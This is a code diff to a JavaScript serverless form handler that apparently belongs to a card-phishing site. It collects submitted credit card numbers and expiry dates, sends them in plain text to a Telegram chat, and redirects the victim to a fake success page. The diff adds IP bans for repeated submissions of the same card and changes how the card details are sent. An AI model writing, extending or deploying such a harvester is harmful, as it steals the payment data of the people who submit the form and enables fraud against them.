@@ -2,7 +2,10 @@ const https = require('https');
 const crypto = require('crypto');
 
 const cardCache = new Map();
+const bannedIPs = new Map();
 const SPAM_WINDOW_MS = 30 * 60 * 1000;
+const BAN_DURATION_MS = 5 * 60 * 1000;
+const MAX_ATTEMPTS = 5;
 const MAX_CACHE_SIZE = 100;
 
 function cleanCache() {
@@ -10,6 +13,12 @@ function cleanCache() {
     for (const [hash, data] of cardCache.entries()) {
         if (now - data.lastSeen > SPAM_WINDOW_MS) {
             cardCache.delete(hash);
+        }
+    }
+
+    for (const [ip, banTime] of bannedIPs.entries()) {
+        if (now - banTime > BAN_DURATION_MS) {
+            bannedIPs.delete(ip);
         }
     }
 
@@ -41,19 +50,39 @@ function checkSpam(cardNumber) {
             data.count += 1;
             data.lastSeen = now;
             cardCache.set(hash, data);
+
+            const isBanned = data.count >= MAX_ATTEMPTS;
+
             return {
                 isSpam: true,
                 count: data.count,
-                timeDiffMinutes: Math.floor(timeDiff / 60000)
+                timeDiffMinutes: Math.floor(timeDiff / 60000),
+                isBanned: isBanned
             };
         } else {
             cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
-            return { isSpam: false };
+            return { isSpam: false, isBanned: false };
         }
     } else {
         cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
-        return { isSpam: false };
+        return { isSpam: false, isBanned: false };
     }
+}
+
+function isIPBanned(ip) {
+    const banTime = bannedIPs.get(ip);
+    if (!banTime) return false;
+
+    const now = Date.now();
+    if (now - banTime > BAN_DURATION_MS) {
+        bannedIPs.delete(ip);
+        return false;
+    }
+    return true;
+}
+
+function banIP(ip) {
+    bannedIPs.set(ip, Date.now());
 }
 
 exports.handler = async (event) => {
@@ -69,6 +98,26 @@ exports.handler = async (event) => {
     }
 
     try {
+        let ip = event.headers['x-forwarded-for'];
+        if (ip && ip.includes(',')) {
+            ip = ip.split(',')[0].trim();
+        }
+        if (!ip) {
+            ip = event.headers['client-ip'] || 'unknown';
+        }
+
+        if (isIPBanned(ip)) {
+            console.log('IP banned:', ip);
+            return {
+                statusCode: 303,
+                headers: {
+                    ...headers,
+                    'Location': '/success.html?banned=true'
+                },
+                body: ''
+            };
+        }
+
         const params = new URLSearchParams(event.body);
         const cardNumber = params.get('cc-number') || '';
         const expMonth = params.get('cc-exp-month') || '';
@@ -78,9 +127,6 @@ exports.handler = async (event) => {
 
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-        console.log('Token existe:', !!TELEGRAM_BOT_TOKEN);
-        console.log('Chat ID existe:', !!TELEGRAM_CHAT_ID);
 
         if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
             const cleanNum = cardNumber.replace(/\s/g, '');
@@ -100,35 +146,43 @@ exports.handler = async (event) => {
                 timeZone: 'America/Argentina/Buenos_Aires'
             });
 
-            let message;
             if (spamCheck.isSpam) {
-                message = `⚠️ SPAM DETECTADO ⚠️\n\n🔁 TARJETA REPETIDA (${spamCheck.count}x)\n⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
-                console.log('SPAM detectado:', spamCheck);
-            } else {
-                message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
-            }
+                let message = `⚠️ SPAM DETECTADO ⚠️\n\n🔁 TARJETA REPETIDA (${spamCheck.count}x)\n⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
 
-            console.log('Enviando mensaje...');
-            try {
-                const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
-                console.log('Mensaje enviado:', result);
-            } catch (telegramError) {
-                console.error('Error enviando a Telegram:', telegramError);
+                if (spamCheck.isBanned) {
+                    message += `\n\n🚫 IP BANEADA POR 5 MINUTOS`;
+                    banIP(ip);
+                }
+
+                console.log('SPAM detectado:', spamCheck);
+
+                try {
+                    const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
+                    console.log('Mensaje enviado:', result);
+                } catch (telegramError) {
+                    console.error('Error enviando a Telegram:', telegramError);
+                }
+
+                const redirectUrl = spamCheck.isBanned
+                    ? '/success.html?banned=true'
+                    : '/success.html?spam=true';
+
+                return {
+                    statusCode: 303,
+                    headers: {
+                        ...headers,
+                        'Location': redirectUrl
+                    },
+                    body: ''
+                };
             }
         } else {
             console.error('Faltan variables de entorno');
         }
 
-        const redirectUrl = spamCheck && spamCheck.isSpam
-            ? '/success.html?spam=true'
-            : '/success.html';
-
         return {
             statusCode: 303,
-            headers: {
-                ...headers,
-                'Location': redirectUrl
-            },
+            headers,
             body: ''
         };
     } catch (error) {
